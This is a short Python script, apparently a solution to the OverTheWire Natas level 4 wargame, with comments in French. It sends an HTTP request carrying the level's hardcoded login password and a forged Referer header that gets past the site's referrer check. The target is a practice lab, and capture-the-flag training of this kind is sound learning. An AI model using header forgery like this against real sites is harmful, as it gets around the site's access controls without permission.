#!/usr/bin/python

import re
import html
import sys
import requests
from requests.auth import HTTPBasicAuth

url = sys.argv[1]
print(url)
user = 'natas4'
password = 'Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ'

headers = {'Referer' : 'http://natas5.natas.labs.overthewire.org/'}
res = requests.get(url, auth=HTTPBasicAuth(user, password), headers=headers)

def findReferer(HTMLResponse):
        # Recherche basée sur une expression régulière
	h = re.search('only from "(.*)"', HTMLResponse.text)
        # Si l'objet "h" n'est pas vide, c'est qu'une expression a été trouvée
	if h :
		return(h.group(1))

# Première requête pour obtenir le texte dans lequel rechercher.
#res = requests.get(url, auth=HTTPBasicAuth(user, password))

# Utilisation de la fonction de recherche du bon Referer sur le résultat de cette première requête
#acceptedReferer = findReferer(res)

# Je crée une liste d'en-tête à ajouter à la requête
#headers = {'Referer' : acceptedReferer} 

# J'envoi la seconde requête avec le Referer attendu
#res = requests.get(url, auth=HTTPBasicAuth(user, password),headers=headers)





 
